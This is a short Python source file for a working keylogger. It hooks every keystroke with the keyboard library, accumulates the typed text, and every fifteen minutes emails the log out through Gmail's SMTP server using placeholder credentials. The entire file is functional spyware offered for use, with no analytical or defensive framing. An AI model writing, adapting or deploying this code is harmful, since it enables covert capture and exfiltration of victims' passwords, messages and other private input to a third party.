import keyboard
import smtplib
from threading import Semaphore, Timer

SEND_REPORT_EVERY = 900  # 15 minutes
EMAIL_ADDRESS = "Your_Email_Goes_Here"
EMAIL_PASSWORD = "Your_Password_Goes_Here"

class Keylogger:
    def __init__(self, interval):
        self.interval = interval
        self.log = ""
        self.semaphore = Semaphore(0)

    def callback(self, event):
        name = event.name
        if len(name) > 1:
            name = {
                "space": " ",
                "enter": "[ENTER]\n",
                "decimal": ".",
            }.get(name, f"[{name.replace(' ', '_').upper()}]")
        self.log += name

    def sendmail(self, email, password, message):
        server = smtplib.SMTP(host="smtp.gmail.com", port=587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, message)
        server.quit()

    def report(self):
        if self.log:
            self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
        self.log = ""
        Timer(interval=self.interval, function=self.report).start()

    def start(self):
        keyboard.on_release(callback=self.callback)
        self.report()
        self.semaphore.acquire()

if __name__ == "__main__":
    keylogger = Keylogger(interval=SEND_REPORT_EVERY)
    keylogger.start()